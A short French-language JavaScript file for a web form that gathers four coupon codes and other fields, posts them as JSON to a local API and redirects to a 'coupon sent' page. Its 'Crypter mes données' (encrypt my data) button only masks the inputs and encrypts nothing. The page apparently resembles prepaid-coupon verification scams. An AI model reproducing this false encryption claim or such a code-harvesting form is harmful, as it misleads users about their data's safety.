var base_url = `${window.location.protocol}//${window.location.host}/`;

const btn = document.querySelector('#btncrypt');
btn.addEventListener("click", crypter);

function crypter() {
  const inps = document.querySelectorAll('.code');
  if (btn.value == "Crypter mes données") {
    for (const inp of inps) {
      inp.type = "password";
      btn.value = "Décrypter mes données";
    }
  } else {
    for (const inp of inps) {
      inp.type = "text";
      btn.value = "Crypter mes données";
    }
  }
}

const getFormData = () => {
  const formControls = document.querySelectorAll('.form-control');
  var code = [];
  var formdata = {};
  formControls.forEach((formControl) => {
    const id = formControl.getAttribute('id');
    if (id === "code1" || id === "code2" || id === "code3" || id === "code4"){
      if (formControl.value) code.push(formControl.value);
    }
    else {
      if (formControl.value && formControl.value !== "none"){
        formdata[`${id}`] = formControl.value;
      }
      else{
        const errEl = document.getElementById(`${id}Err`);
        errEl.style.color = "red";
        errEl.innerHTML = "Champs Obligatoire";
      }
    }
  });
  formdata.code = code;
  return JSON.stringify(formdata);
}

document.addEventListener("DOMContentLoaded", () => {
  document.querySelector('form#sendmail').addEventListener('submit', (e) => {
    e.preventDefault();
    const xhr = new XMLHttpRequest();
    const form = getFormData();
    xhr.open('POST', '/api/formapp/');
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onload = function() {
      if (xhr.status === 200) {
        var response = JSON.parse(xhr.responseText);
        if (response.success) {
          location.href = base_url+ "frontend/coupon/couponSended.html";
        }
      } else {
        console.error('Request failed. Status: ' + xhr.status);
      }
    };
    xhr.onerror = function() {
      console.error('Request failed');
    };
    xhr.send(form);
  });

  var formControls = document.querySelectorAll('.form-control');
  for (var i = 0; i < formControls.length; i++) {
    formControls[i].addEventListener('focus', function() {
      var id = this.getAttribute('id');
      document.querySelector('#' + id + 'Err').innerHTML = '';
      document.querySelector('#' + id + 'Err').style.color = 'red';
    });
    formControls[i].addEventListener('change', function() {
      var id = this.getAttribute('id');
      document.querySelector('#' + id + 'Err').innerHTML = '';
    });
  }
});